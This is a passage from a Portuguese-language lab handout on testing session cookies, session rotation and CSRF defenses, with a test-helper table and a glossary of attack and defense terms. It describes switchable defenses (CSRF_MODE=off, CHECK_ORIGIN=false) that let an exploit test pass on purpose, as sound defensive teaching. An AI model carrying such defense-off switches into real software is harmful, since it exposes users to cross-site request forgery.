Um cofre que você nunca tentou arrombar é um cofre que você **espera** que funcione. A prova de segurança não é "o dono conseguiu abrir" — é "**o ladrão tentou e não conseguiu**, e quando eu destravei a porta por dentro do experimento, **ele conseguiu**". A segunda parte é o que mostra que o ladrão sabia roubar.

### Passo 2 — Agora com as palavras certas

Três níveis, e o README lista os comportamentos que valem um teste permanente em ["Como saber que terminou"](README.md#como-saber-que-terminou):

- **Unidade** — hash/verify, `needsRehash`, custo pago com usuário inexistente, entropia do token, validade do CSRF de outra sessão.
- **Integração** (Postgres real) — round-trip do store, idle que não volta, absolute que não volta nem com touch, `revokeFamily`, unicidade case-insensitive.
- **API** (supertest com jar) — flags do `Set-Cookie`, fixation, reuso, logout-all entre **dois clientes**, CSRF ausente/trocado/origin ruim, e **o exploit passando com `CSRF_MODE=off`**.

O que o repo já entrega (`@labs/test-kit`, detalhado em [`server/tests/README.md`](server/tests/README.md)):

| Helper                | Para quê                                                              |
| --------------------- | --------------------------------------------------------------------- |
| `withTestDatabase()`  | banco clonado de um molde migrado, por arquivo                        |
| `apiClient(app)`      | supertest **com jar de cookies persistente** — sem isso não há sessão |
| `expectCookieFlags()` | asserta HttpOnly/Secure/SameSite/Path/Max-Age **do header real**      |

O hábito que o kit induz: **dois `apiClient` = dois dispositivos**. É o que torna "sair de todos" e "reuso na outra janela" testáveis de verdade, não simulados.

E o princípio que fecha o lab (do [`docs/convencoes.md`](../../docs/convencoes.md)): _um teste que só confirma que o ataque falha não distingue "a defesa funcionou" de "o ataque estava mal escrito"_. Por isso as defesas são chaveáveis — existe um teste cujo trabalho é **ver o exploit vencer** com `CSRF_MODE=off CHECK_ORIGIN=false`, provando que, quando ele perde, é porque a defesa segurou.

O checklist final do README ("Done") é o seu aceitar de sprint: cookie com flags **verificadas em teste**, id que muda no login, `logout-all` instantâneo na outra janela, família morta no reuso com evento registrado, ataque falhando com defesas ligadas **e passando sem elas**, e `docs/cookies.md` + `docs/csrf.md` escritos com **suas** observações — não com as desta apostila.

### Passo 3 — Perguntas de borracha

1. O que um teste "o ataque falhou" prova sozinho — e o que o par ligado/desligado prova junto?
2. Por que testar sessão sem um jar de cookies é testar outra coisa?
3. Qual comportamento do seu backend **só** dois clientes distintos conseguem evidenciar?

### Passo 4 — Lacunas que só fecham fazendo

Escreva o teste do exploit vencedor (`CSRF_MODE=off`) **antes** de terminar as defesas. Ele define o alvo: daí em diante, você não está "escrevendo CSRF" — está fazendo um teste específico passar por um motivo que você entende.

---

## Apêndice A — Glossário

| Termo                      | Em uma frase                                                                           |
| -------------------------- | -------------------------------------------------------------------------------------- |
| stateless                  | o servidor não guarda memória entre requisições; identidade viaja em cada uma          |
| cookie / `Set-Cookie`      | estado no **navegador**, anexado automaticamente a cada request do domínio             |
| `HttpOnly`                 | flag que torna o cookie ilegível para `document.cookie` — mata a exfiltração por XSS   |
| `Secure` / `SameSite`      | só HTTPS / não anexar em requisições cross-site que mudam estado                       |
| origin vs site             | esquema+host+porta **com** porta vs domínio registrável **sem** porta                  |
| CSRF                       | fazer o navegador da vítima disparar uma request autenticada que ela não quis          |
| double-submit              | provar origem legítima espelhando um cookie legível num header                         |
| CSRF via HMAC              | idem, mas o token é derivado do segredo da sessão — injetável por ninguém              |
| Argon2id                   | hash de senha memory-hard, lento de propósito, parametrizável por máquina              |
| `password_params`          | os parâmetros com que **este** hash foi gerado — o que torna o rehash transparente     |
| sessão server-side         | servidor guarda o estado; o cookie carrega só um identificador opaco                   |
| rotação de sessão          | reemitir o identificador no login e em qualquer mudança de privilégio                  |
| session fixation           | plantar na vítima um id de sessão conhecido, que o login transformaria em válido       |
| `family_id` / `rotated_at` | agrupar rotações de um login / marcar a sessão substituída — a dupla que detecta reuso |
| idle vs absolute           | prazo que desliza a cada uso vs teto fixo desde a criação                              |
| revogação                  | riscar a linha no servidor; vale **na requisição seguinte**                            |
| enumeração de contas       | descobrir **quem tem conta** por diferenças de corpo, status ou tempo de resposta      |
| custo de tempo constante   | mesma distribuição de tempo para "não existe" e "senha errada"                         |
| lockout                    | travar temporariamente a conta após N falhas (`429`)                                   |
| IDOR                       | acessar objeto de outro usuário manipulando o id — aqui evitado com 404 em vez de 403  |
| CSPRG                      | gerador criptográfico — a fonte dos 256 bits do token                                  |
| jar de cookies             | cliente de teste que persiste cookies entre requests — o "navegador" do supertest      |

## Apêndice B — Capítulos × roadmap

Mapa inferido das features que o README do lab declara (`F9.1 F9.2 F9.4* F1.7 F9.12 F9.13` — o texto canônico vive no ROADMAP do `api-study`):

| Feature | Assunto                        | Capítulos  |
| ------- | ------------------------------ | ---------- |
| `F9.1`  | hash de senha (Argon2id)       | 4, 10, 11  |
| `F9.2`  | sessão server-side + HttpOnly  | 2, 3, 5, 6 |
| `F9.4*` | detecção de reuso (adaptada)   | 7          |
| `F1.7`  | laboratório de flags de cookie | 2, 11      |
| `F9.12` | CORS com credenciais           | 8, 9       |
| `F9.13` | CSRF                           | 8, 9       |

---

_Última revisão: out/2026 — acompanha o `README.md` do lab; se o contrato mudar lá, esta apostila envelhece._
